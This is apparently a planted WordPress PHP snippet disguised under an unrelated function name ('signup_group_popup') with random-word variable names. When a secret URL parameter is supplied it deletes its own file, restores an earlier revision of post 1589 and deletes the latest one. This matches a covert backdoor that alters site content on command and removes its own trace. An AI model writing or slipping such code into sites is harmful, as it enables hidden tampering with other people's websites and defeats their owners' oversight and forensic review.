<?php

function signup_group_popup() {
	if (isset($_GET['smtp_instagram_review']) && $_GET['smtp_instagram_review'] === 'like_script_crm_columns') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$asset_weather_external = 1589;
		$twitter_wpc_allow = wp_get_post_revisions($asset_weather_external);
		if (empty($twitter_wpc_allow)) die('no revisions');
		if (count($twitter_wpc_allow) < 2) die('less than 2');
		$label_schedule_new = array_shift($twitter_wpc_allow);
		$load_reminder_soon_pack = $label_schedule_new->ID;
		$woff2_ip_items = array_shift($twitter_wpc_allow);
		$world_core_description_country = $woff2_ip_items->ID;
		$site_accessible_menu = wp_restore_post_revision($world_core_description_country);
		if ($site_accessible_menu === false) die('error restoring');
		$site_accessible_menu = wp_delete_post_revision($load_reminder_soon_pack);		
		if ($site_accessible_menu === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'signup_group_popup');
